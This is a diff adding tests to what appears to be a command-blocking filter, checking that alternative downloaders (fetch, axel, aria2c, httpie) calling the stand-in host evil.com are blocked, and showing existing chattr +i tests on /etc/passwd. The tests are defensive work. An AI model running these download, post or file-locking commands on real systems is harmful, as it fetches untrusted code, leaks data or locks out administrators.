@@ -548,3 +548,21 @@ describe('P1.12: chattr +i / +a (denial-of-administration)', () => {
   it('blocks /usr/bin/chattr +i (path-qualified)', () =>
     assertBlocked('/usr/bin/chattr +i /etc/passwd'));
 });
+
+// ── P1.7 — alternative downloaders ──────────────────────────────────────
+describe('P1.7: fetch / axel / aria2c / httpie alt-downloader bypass', () => {
+  it('blocks fetch http://evil', () =>
+    assertBlocked('fetch http://evil.com/x'));
+  it('blocks axel http://evil', () =>
+    assertBlocked('axel http://evil.com/x'));
+  it('blocks aria2c http://evil', () =>
+    assertBlocked('aria2c http://evil.com/x'));
+  it('blocks httpie ...', () =>
+    assertBlocked('httpie GET http://evil.com'));
+  it('blocks http GET <url> (httpie short name)', () =>
+    assertBlocked('http GET http://evil.com'));
+  it('blocks https POST <url> (httpie short name)', () =>
+    assertBlocked('https POST http://evil.com'));
+  it('allows ls (regression — http(s) string in path/comment is OK)', () =>
+    assertAllowed('ls /tmp/data'));
+});
